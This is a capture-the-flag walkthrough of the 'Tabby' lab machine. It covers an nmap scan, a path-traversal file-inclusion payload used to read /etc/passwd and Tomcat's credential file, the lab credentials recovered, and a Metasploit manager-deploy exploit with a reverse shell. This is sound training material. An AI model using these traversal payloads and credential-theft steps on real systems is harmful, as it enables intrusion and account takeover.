# Tabby - Linux - Easy

## TL;DR

find tomcat9 user config file, get user and password as `tomcat` and `$3cureP4s5w0rd123!`, use metasploit module `multi/http/tomcat_mgr_deploy`, set target to 3 as linux, exploit, set payload as linux reverse tcp, exploit. Find `16162020_backup.zip`, crack zip password using fcrackzip as `admin@it`, use metasploit and get shell, `su ash`:`admin@it`, get user flag. Use `sudo cat /root/root.txt` and get root flag.

## Breaking it down

`nmap -sC -sV -A -T4 -p- 10.10.10.194`
```
Nmap scan report for tabby.htb (10.10.10.194)
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-title: Mega Hosting
8080/tcp open  http-proxy
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
```

add to `/etc/hosts` 10.10.10.194 as `tabby.htb`

go to `10.10.10.194` as website

update `/etc/hosts` 10.10.10.194 as `megahosting.htb`


navigate to news

```
We apologise to all our customers for the previous data breach.

We have changed the site to remove this tool, and have invested heavily in more secure servers`
```

http://10.10.10.194/news.php?file=statement

the url indicates that the file is being served from server side, possible lfi.

http://10.10.10.194/news.php?file=../../../../../etc/passwd

gives us root and ash having /bin/bash


tomcat9 has a manager login, and can find users in tomcat-users.xml
in order to find the directory that tomcat is located, we will install the tomcat9 server locally with `sudo apt-get install tomcat9` and manually from the tomcat website, and then we will run `sudo find / -name tomcat-users*`

```
/usr/share/tomcat9/etc/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xsd
/opt/tomcat/conf/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
```

get the config file using one of those links, will not be visible as an actual page.

wget http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml 

   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

go to http://10.10.10.194:8080/host-manager/html/ and login



use metasploit and the metasploit module `multi/http/tomcat_mgr_deploy`, set all options and switch target to 3 for linux, exploit.



## Wrong pathways

Attempted to script up service downloading every file that matched using bash
Attempted setting up smbserver using smbserver.py from impacket and hosting a .war file to deploy on the machine
Attempted to use lxd exploit
https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/
https://hacknews247.com/how-to/20191012/lxd-privilege-escalation.html/amp

## What did I learn?
- find from bash
- ls -l
- sudo -l -U ash